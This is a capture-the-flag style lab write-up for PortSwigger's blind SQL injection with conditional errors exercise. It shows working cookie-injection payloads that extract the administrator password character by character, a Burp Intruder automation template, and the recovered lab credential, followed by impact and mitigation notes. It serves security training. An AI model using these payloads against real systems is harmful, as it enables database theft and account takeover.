# Blind SQL injection with conditional errors

**Source:** [PortSwigger](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)  
**Category:** SQL Injection  
**Difficulty:** PRACTITIONER

## Objective
To solve the lab, log in as the `administrator` user.

## Vulnerability
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

## Exploitation

### Steps

1. Intercepted the HTTP request while attempting to log in as `administrator:test`. Identified the `TrackingId` cookie parameter and sent it to Repeater.

2. Tested different values of the `TrackingId` cookie parameter:
    - `TrackingId=xj6LQvbsjLtH9jO9;` - default query
    - `TrackingId=xj6LQvbsjLtH9jO9';` - Internal Server Error
    - `TrackingId=xj6LQvbsjLtH9jO9'--;` - no error
    - `TrackingId=xj6LQvbsjLtH9jO9 AND 1=1--;` - no error
    - `TrackingId=xj6LQvbsjLtH9jO9 AND 1=2--;` - no error
    - `TrackingId=xj6LQvbsjLtH9jO9''` - no error
    - `TrackingId=xj6LQvbsjLtH9jO9'||TO_CHAR(1/0)||';` - Internal Server Error
    - `TrackingId=xj6LQvbsjLtH9jO9'||(SELECT password FROM users WHERE username='administrator')||';` - no error
    - `TrackingId=xj6LQvbsjLtH9jO9'||(SELECT CASE WHEN 1=2 THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||';` - no error
    - `TrackingId=xj6LQvbsjLtH9jO9'||(SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||';` - Internal Server Error

3. Checked the password length using the following query. A value of `20` returned an error, indicating that the administrator password length is 20 characters.

```sql
'||(SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```

4. Configured Burp Intruder to automate password extraction.
    - Used the **Cluster Bomb** attack type.
    - Created two payload positions:
        - First position: password character index, using numbers from 1 to 20.
        - Second position: list of possible characters containing lowercase letters and numbers from 0 to 9.

    Example:
    ```http
    TrackingId=xj6LQvbsjLtH9jO9'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||';
    ```

    The correct values were identified by responses with HTTP status code `500` in the Intruder attack.

    Due to the long execution time, the attack was divided into smaller ranges by changing the first payload position into smaller groups, for example:
    - 1-2
    - 3-4
    - 5-6

5. Reconstructed the password by matching the first payload position with the correct character from the second payload.
    Final result: `administrator:jiuu17lmvqwa462ibbsx`

6. Successfully logged in as the administrator user.

### Payload

**Error-based SQL injection test:**

```sql
'||TO_CHAR(1/0)||'
```

**Password length detection:**

```sql
'||(SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```

**Password character extraction:**

```sql
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```

**Burp Intruder payload template:**

```http
TrackingId=xj6LQvbsjLtH9jO9'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||';
```

**Extracted credentials:**

```text
administrator:jiuu17lmvqwa462ibbsx
```

### Shortcut

1. Send the `TrackingId` cookie to Burp Intruder.
2. Use a **Cluster Bomb** attack to extract the administrator password:
   - First payload position: password character index (`1-20`).
   - Second payload position: possible characters (`a-z`, `0-9`).

3. Use conditional errors as the success indicator. Correct characters will return HTTP status code `500`.
```http
TrackingId=<value>'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||';
```

4. Reconstruct the password from the extracted characters and log in as `administrator`.

## Impact
Blind SQL injection allows attackers to extract sensitive information from the database even when query results are not directly displayed. By using conditional errors, an attacker can retrieve usernames, passwords, and other confidential data, potentially leading to account takeover.


## Mitigation
Use parameterized queries (prepared statements) to prevent user-controlled input from being interpreted as SQL code. Avoid exposing database errors to users, as error messages can provide useful information for exploitation. Database accounts used by applications should also follow the principle of least privilege.


## Tools
- Burp Suite
- Repeater
- Intruder

## Notes
This lab demonstrates how blind SQL injection can be exploited when the application does not return database results. Conditional errors can be used as a boolean indicator, allowing an attacker to extract data character by character. Burp Intruder can automate this process by testing multiple character positions and possible values.